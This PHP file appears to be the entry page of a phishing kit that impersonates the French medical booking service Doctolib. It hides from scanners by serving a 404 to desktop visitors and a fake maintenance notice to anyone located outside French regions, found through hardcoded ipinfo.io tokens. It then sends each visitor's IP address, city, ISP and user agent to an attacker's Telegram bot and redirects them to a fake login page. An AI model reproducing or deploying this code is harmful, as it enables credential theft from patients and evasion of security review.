<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}
?>
<?php
session_start();
include('email.php');

function isMobile() {
    return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/", $_SERVER['HTTP_USER_AGENT']);
}

// Vérifie si l'utilisateur utilise un appareil mobile
if (!isMobile()) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

// Récupère l'IP de l'utilisateur
function getUserIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
}

// Fonction pour récupérer les informations IP avec IPinfo.io
function getIpInfo($ip, $token) {
    $url = "https://ipinfo.io/{$ip}/json?token={$token}";
    $response = @file_get_contents($url);
    return $response ? json_decode($response, true) : null;
}

// Liste des régions acceptées
$accepted_regions = [
    'Auvergne-Rhône-Alpes', 'Bourgogne-Franche-Comté', 'Brittany', 'Centre-Val de Loire', 
    'Corsica', 'Grand Est', 'Hauts-de-France', 'Île-de-France', 'Normandy', 'New Aquitaine', 
    'Occitanie', 'Pays de la Loire', 'Provence-Alpes-Côte d\'Azur'
];

// Récupération de l'IP de l'utilisateur
$ip = getUserIP();

// Essai de récupération des informations IP avec plusieurs tokens
$tokens = ["b94cfa469790b9", "1c0d77dce5736a"];
$ipinfo_data = null;

foreach ($tokens as $token) {
    $ipinfo_data = getIpInfo($ip, $token);
    if ($ipinfo_data !== null) {
        break;
    }
}

// Blocage si les informations IP ne peuvent pas être obtenues ou si la région n'est pas acceptée
if ($ipinfo_data === null || !in_array($ipinfo_data['region'] ?? '', $accepted_regions)) {
    header('HTTP/1.0 403 Forbidden');
    echo "Notre site est actuellement en cours de maintenance afin d'améliorer votre expérience. Nous serons de retour très bientôt !";
    exit();
}

// Création et envoi du message de connexion à Telegram
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$city = $ipinfo_data['city'] ?? 'Inconnue';
$org = $ipinfo_data['org'] ?? $ipinfo_data['isp'] ?? 'Inconnue';

$message = "
「🏥+1 DOCTOLIB 🏥」
    
「🎊」 NEW CONNECTION DETECTED
            
「📡」 Adresse IP : {$ip}
「🏙️」 City : {$city}
「🏨」 Organization : {$org}
「📡」 User Agent : {$user_agent}
";

function sendTelegramMessage($message, $bot_token, $chat_id) {
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage?chat_id={$chat_id}&text=" . urlencode($message);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

sendTelegramMessage($message, $bot_token, $chat_id);

// Redirection vers la page de connexion
header('Location: Se-connecter.php');
exit();
?>
